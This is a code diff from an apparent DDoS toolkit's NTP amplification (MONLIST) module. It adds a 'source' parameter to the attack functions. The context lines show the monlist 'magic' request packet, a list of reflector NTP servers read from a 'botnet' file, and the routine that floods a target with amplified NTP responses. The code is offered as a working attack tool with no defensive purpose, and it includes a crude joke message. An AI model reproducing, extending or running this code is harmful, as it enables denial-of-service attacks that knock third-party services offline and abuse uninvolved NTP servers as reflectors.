@@ -22,7 +22,7 @@ ntp_file = "botnet/ntp.txt" # NTP servers IP list
 data = "\x1b\x00\x00\x00"+"\x00"*11*4 # NTP v3 Monlist 'magic' packet!
 
 # UFONet NTP Amplification (MONLIST) / [Port: 123]
-def monlistize(ip, rounds):
+def monlistize(ip, rounds, source = None):
     n=0
     try: # (NTP) Amplification attack uses publically accessible NTP servers to flood a target with NTP response traffic
         with open(ntp_file) as f: # extract NTP servers from file
@@ -47,7 +47,7 @@ def monlistize(ip, rounds):
         print("[Error] [AI] [MONLIST] Failing to engage... -> Is still target online? -> [Checking!]")
 
 class MONLIST(object):
-    def attacking(self, target, rounds):
+    def attacking(self, target, rounds, source = None):
         print("[Info] [AI] NTP Amplification (MONLIST) is ready to broke: [" , rounds, "parsecs ]")
         if target.startswith('http://'):
             target = target.replace('http://','')
@@ -69,4 +69,4 @@ class MONLIST(object):
         if ip == "127.0.0.1" or ip == "localhost":
             print("[Info] [AI] [MONLIST] Sending message '1/0 %====D 2 Ur ;-0' to 'localhost' -> [OK!]\n")
             return
-        monlistize(ip, rounds) # attack with MONLIST using threading
+        monlistize(ip, rounds, source) # attack with MONLIST using threading
